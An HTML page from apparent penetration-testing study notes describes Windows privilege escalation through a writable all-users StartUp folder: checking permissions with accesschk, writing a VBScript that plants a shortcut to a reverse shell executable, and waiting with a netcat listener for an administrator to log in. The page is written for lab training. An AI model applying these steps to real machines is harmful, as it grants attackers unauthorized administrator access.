<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>7. Startup Apps</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>7. Startup Apps</h1><br/><br /><strong><h3>Startup Apps</h3></strong><br />• Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.<br />• Windows also has a startup directory for apps that should start for all users:<br />    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br />• If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.<br /><br /><br /><br />1. Use accesschk.exe to check permissions on the StartUp directory:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -d &#39;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&#39;&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1336-1.png" alt="images/1336-1.png" /></a><br />    The BUILTIN Users group has write access to &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot; directory so we can add a startup app which will start whenever any user logs in <br /><br />2. Startups in &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot; must be shortcuts, also known as link files(.lnk)<br />3. Create a file CreateShortcut.vbs with the following VBScript. Change the oLink.TargetPath variable path<br />    <div class="codebox"><pre>Set oWS = WScript.CreateObject<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;WScript.Shell&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br />sLinkFile = <span style="color:#3ad900;font-weight:400">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;</span><br />Set oLink = oWS.CreateShortcut<span style="color:#ff9d00;font-weight:700">(</span>sLinkFile<span style="color:#ff9d00;font-weight:700">)</span><br />oLink.TargetPath = <span style="color:#3ad900;font-weight:400">&quot;C:\PrivEsc\reverse.exe&quot;</span><br />oLink.Save</pre></div><br />    We can copy paste all the following code to create the CreateShortcut.vbs file<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">echo</span> Set oWS = WScript.CreateObject<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;WScript.Shell&quot;</span><span style="color:#ff9d00;font-weight:700">)</span> &gt; CreateShortcut.vbs<br /><span style="color:#ff9d00;font-weight:700">echo</span> sLinkFile = <span style="color:#3ad900;font-weight:400">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;</span> &gt;&gt; CreateShortcut.vbs<br /><span style="color:#ff9d00;font-weight:700">echo</span> Set oLink = oWS.CreateShortcut<span style="color:#ff9d00;font-weight:700">(</span>sLinkFile<span style="color:#ff9d00;font-weight:700">)</span> &gt;&gt; CreateShortcut.vbs<br /><span style="color:#ff9d00;font-weight:700">echo</span> oLink.TargetPath = <span style="color:#3ad900;font-weight:400">&quot;C:\PrivEsc\reverse.exe&quot;</span> &gt;&gt; CreateShortcut.vbs<br /><span style="color:#ff9d00;font-weight:700">echo</span> oLink.Save &gt;&gt; CreateShortcut.vbs</pre></div><br />    veryfy that the file is been created<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">type</span> CreateShortcut.vbs</pre></div><br />    <a href=""><img src="images/1336-2.png" alt="images/1336-2.png" /></a><br />5. Run the script using cscript:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> cscript CreateShortcut.vbs</pre></div><br /><br />5. Start a listener on Kali<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />7.  When the administrator user will login on the target Windows, he will trigger automatically the exploit.<br />    <a href=""><img src="images/1336-3.png" alt="images/1336-3.png" /></a></div>
</body>
</html>
